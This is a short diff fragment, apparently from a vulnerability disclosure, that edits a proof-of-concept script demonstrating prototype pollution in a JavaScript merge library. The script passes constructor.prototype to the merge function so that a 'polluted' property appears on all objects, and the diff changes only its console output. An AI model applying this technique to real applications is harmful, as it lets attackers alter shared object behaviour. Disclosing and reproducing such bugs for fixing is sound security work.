@@ -9,9 +9,9 @@
 // poc.js
 const merge = require('deep-merge-js')
 
-console.log(`Before: ${{}.polluted}`)
+console.log('Before: ', {}.polluted)
 merge(constructor.prototype, {polluted: true})
-console.log(`After: ${{}.polluted}`)
+console.log('After: ', {}.polluted)
 ```
 2. Execute the following commands in the terminal:
 ```bash
